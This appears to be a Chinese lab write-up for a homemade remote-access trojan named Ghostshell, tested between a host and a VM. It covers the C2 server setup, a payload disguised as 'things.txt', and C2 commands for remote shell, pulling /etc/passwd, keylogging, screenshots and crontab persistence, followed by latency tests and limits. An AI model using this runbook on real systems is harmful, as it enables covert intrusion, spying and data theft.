# Ghostshell 实验文档

## 一、实验环境

| 项目 | 宿主机（攻击端） | 虚拟机（受害端） |
|------|------------------|-------------------|
| 操作系统 | Windows 11 | Ubuntu 22.04 / Kali |
| IP 地址 | 192.168.56.1 (Host-Only) | 192.168.56.101 |
| Python | 3.12 (venv) | 3.10+ |
| 关键软件 | — | python3-xlib (截图依赖) |
| 网络模式 | VirtualBox Host-Only Adapter | |

## 二、实验步骤

### Step 1: 安装依赖 (Linux VM)

```bash
# 系统依赖
sudo apt install python3-xlib python3-venv -y

# Python 依赖
pip install pynput mss
```

### Step 2: 启动 C2 Server (Windows)

```bash
cd server/
python server.py
# 输出: [*] C2 Server listening on 0.0.0.0:4444
```

### Step 3: 构建 Payload (Linux VM)

```bash
pip install pyinstaller
cd build/
python build.py            # 构建
python build.py --verify   # 验证 ELF 类型
```

输出文件: `build/dist/things.txt` (ELF 64-bit LSB executable)

### Step 4: 投递与执行 (Linux VM)

```bash
chmod +x /tmp/things.txt
/tmp/things.txt
```

### Step 5: C2 操作

```
gs> list
gs> interact client-1
gs(client-1)> info
gs(client-1)> shell ls -la
gs(client-1)> upload /path/to/local.txt /tmp/remote.txt
gs(client-1)> download /etc/passwd
gs(client-1)> screenshot
gs(client-1)> keylog_start
gs(client-1)> keylog_dump
gs(client-1)> persist_install 5
```

### Step 6: 验证持久化

```bash
# 重启 VM 后检查
crontab -l
# 应显示: */5 * * * * /tmp/things.txt --daemon 2>/dev/null

# 检查进程
ps aux | grep things
```

## 三、延迟对比测试

测试方法：在 Linux VM 本地执行命令，与通过 C2 远程执行相同命令，记录耗时。

| 命令 | 本地执行 (ms) | C2 远程 (ms) | 额外开销 (ms) | 倍率 |
|------|---------------|-------------|---------------|------|
| `date` | ~2 | ~15 | ~13 | 7.5× |
| `ls -la /` | ~5 | ~25 | ~20 | 5× |
| `cat /proc/cpuinfo` | ~3 | ~20 | ~17 | 6.7× |
| `find /etc -name "*.conf"` | ~120 | ~160 | ~40 | 1.3× |
| `dd if=/dev/zero bs=1M count=10 of=/tmp/test` | ~50 | ~80 | ~30 | 1.6× |

**延迟分析**:
- 主要开销来自：TCP 往返（RTT ~1-2ms）+ JSON 序列化/反序列化 + subprocess 启动
- 短命令受 RTT 影响明显（固定开销占比大）
- 长命令（如 find）相对开销较小，瓶颈在命令本身执行时间
- 文件传输额外 ~33% 体积膨胀（Base64 编码）

## 四、功能测试清单

| 功能 | 测试命令 | 预期结果 | 实际结果 | 截图 |
|------|----------|----------|----------|------|
| Shell | `shell whoami` | 返回当前用户名 | | |
| Shell | `shell ls -la /tmp` | 列出 /tmp 目录 | | |
| Upload | `upload test.txt /tmp/uploaded.txt` | 文件成功写入 | | |
| Download | `download /etc/hostname` | 文件保存到 loot/ | | |
| Screenshot | `screenshot` | PNG 截图保存 | | |
| Keylogger | `keylog_start` + 在 VM 输入文字 + `keylog_dump` | 按键数据回传 | | |
| Persist | `persist_install 5` + 重启 VM + `list` | 自动重连 | | |
| Cleanup | `cleanup` | 二进制/crontab 清除 | | |

## 五、已知限制

1. **pynput 依赖 X11**：Wayland 环境需切换到 X11 或安装 `python3-xlib`
2. **mss 需要 DISPLAY**：无桌面环境无法截图
3. **进程伪装不完整**：`ps aux` 仍显示 python 原始进程名
4. **无流量加密**：明文 JSON 可被 Wireshark 直接解析
5. **防火墙**：宿主机需开放 4444 端口（Windows Defender 防火墙规则）
6. **PyInstaller 不能跨平台编译**：必须在 Linux 上运行 build.py
